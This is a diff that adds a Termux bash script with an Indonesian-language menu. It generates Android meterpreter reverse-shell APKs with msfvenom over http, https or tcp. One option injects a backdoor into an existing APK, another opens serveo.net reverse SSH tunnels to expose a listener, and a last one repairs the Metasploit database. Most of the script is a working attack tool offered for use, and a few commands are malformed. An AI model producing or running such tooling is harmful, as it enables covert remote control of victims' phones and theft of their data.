@@ -1,0 +1,275 @@
+#!/usr/bin/bash
+
+clear
+
+ 
+mr='\033[1;31m'
+hj='\033[1;32m'
+ku='\033[1;33m'
+bi='\033[1;34m'
+
+cd $HOME
+echo -e $ku
+
+echo 
+echo
+echo -e $ku "this is my tool "
+echo
+echo -e $bi
+echo "1.buat payload"
+echo "2.conect serveo "
+echo "3.sisipkan backdor"
+echo "4 fix msql "
+echo
+echo -e $hj
+read -p "masukkan opsi : " lp
+if [ $lp == 1 ] ; then
+echo " 1.http"
+echo " 2.https"
+echo " 3.tcp " 
+
+echo
+echo -e $ku 
+read -p "masukkan opsi : " po
+if [ $po == 1 ] ; then
+
+read -p "lhost : " b
+read -p "lport : " c
+read -p "name  : " hj
+echo 
+echo
+echo
+echo -e $mr  "using http connection !"
+echo
+echo
+termux-setup-storage
+echo -e $hj " loading .......🕜 "
+msfvenom  -p android/meterpreter/reverse_http lhost=$b lport=$c -o $hj.apk
+termux-setup-storage
+cd $HOME 
+cp $hj.apk $HOME/storage/downloads/
+echo "tersimpan di folder /sdcard/dcim/"
+
+echo 
+echo
+echo
+echo -e $ku "ingin kembali ke home ? y/t"
+read ezz 
+if [ $ezz == y ] ; then 
+cd $HOME
+abc
+
+elif [ $ezz == t ] ; then 
+echo 
+echo " matur suwun"
+
+
+else
+echo
+echo "input salah !"
+fi 
+elif [ $po == 2 ] ; then
+
+read -p "lhost : " b
+read -p "lport : " c
+read -p "name  : " hj
+echo
+echo
+echo
+echo -e $mr  "using https connection !"
+echo
+echo
+termux-setup-storage
+echo -e $hj " loading .......🕜 "
+msfvenom  -p android/meterpreter/reverse_https lhost=$b lport$c -o $hj.apk
+
+cd $HOME
+cp $hj.apk $HOME/storage/downloads/
+echo "tersimpan di folder /sdcard/dcim/"
+echo
+echo
+echo
+echo -e $ku "ingin kembali ke home ? y/t"
+read ezz
+if [ $ezz == y ] ; then
+cd $HOME
+abc
+elif [ $ezz == t ] ; then
+echo
+echo " matur suwun"
+
+
+else
+echo
+echo "input salah !"
+fi
+elif [ $po == 3 ] ; then
+
+read -p "lhost : " b
+read -p "lport : " c
+read -p "name  : " hj
+echo
+echo
+echo
+echo -e $mr  "using tcp connection !"
+echo
+echo
+termux-setup-storage
+echo -e $hj " loading .......🕜 "
+msfvenom  -p android/meterpreter/reverse_tcp lhost=$b lport$c -o $hj.apk
+
+cd $HOME
+cp $hj.apk $HOME/storage/downloads/
+echo "tersimpan di folder /sdcard/dcim/"
+echo
+echo
+echo
+echo -e $ku "ingin kembali ke home ? y/t"
+read ezz
+if [ $ezz == y ] ; then
+cd $HOME
+abc
+elif [ $ezz == t ] ; then
+echo
+echo " matur suwun"
+
+
+else
+echo
+echo "input salah !"
+fi
+else 
+echo "input salah !"
+fi
+elif [ $lp == 2 ] ; then 
+echo "serveo"
+echo
+echo
+echo "1.ssh"
+echo "2.tcp"
+read -p "masukan opsi : "  hu
+if [ $hu == 1 ] ; then 
+read -p "masukan url : " kl
+read -p "masukan port : " lk
+echo
+echo
+echo -e  $ku "connet to "
+echo
+echo  "https://"$kl".serveo.net"
+
+echo  "port : " $lk
+
+echo
+echo -e $ku
+
+autossh -M 0 -R $kl:80:localhost:$lk serveo.net
+echo
+echo 
+
+elif [ $hu == 2 ] ; then
+read -p "masukan port : " c
+
+echo
+echo
+echo " connect to"
+echo "tcp : serveo.net"
+echo "port : " $c
+
+echo
+echo
+echo -e $ku 
+
+autossh -M 0 -R $c:localhost:$c serveo.net
+echo
+echo
+echo
+
+echo
+echo -e $ku "ingin kembali ke home ? y/t"
+echo
+
+read ezz
+if [ $ezz == y ] ; then
+cd $HOME
+abc
+
+elif [ $ezz == t ] ; then
+echo
+echo " matur suwun"
+fi
+
+else
+echo "masukan salah !"
+fi
+
+
+
+elif [ $lp == 3 ] ; then
+echo -e $ku
+read -p "nama apk : " m
+read -p "lhost    : " n
+read -p "lport    : " o
+read -p "nama out : " p
+echo
+echo
+echo -e $mr " using tcp connection ! "
+echo
+echo
+echo -e $hj " loading .............. 🕙"
+echo
+echo
+
+msfvenom -x $m -p android/meterpreter/reverse_tcp LHOST=$n LPORT=$o -o $p.apk
+
+termux-setup-storage
+cd $HOME 
+cp $p.apk $HOME/storage/dcim/
+echo
+echo
+echo "ingin kembali ke home ? y/t " 
+read mn
+if [ $mn == y ] ; then 
+cd $Home 
+abc
+elif [ $mn == t ] ; then 
+echo
+echo
+echo "matur suwun " 
+else
+echo "masukan salah ! " 
+fi
+elif  [ $lp == 4 ] ; then 
+
+echo
+echo
+echo "fix failed to connection database ......... in metasploit " 
+
+echo
+echo " 1.make a fix "
+echo " 2.start connection" 
+echo
+read -p "pilih opsi : " lb
+if [ $lb == 1 ] ; then 
+
+
+mkdir -p $PREFIX/var/lib/postgresql 
+
+initdb $PREFIX/ var/lib /postgresql 
+pg_ctl -D $PREFIX/var/lib/postgresql start 
+sleep 10.5
+cd $HOME
+abc
+elif [ $lb == 2 ] ; then
+
+pg_ctl -D /data/data/com.termux/files/usr/var/lib/postgresql -l logfile start
+sleep 10.2
+cd $HOME
+abc
+else
+echo "salah ! "
+fi
+else 
+echo "masukan salah ! "
+fi
+
+
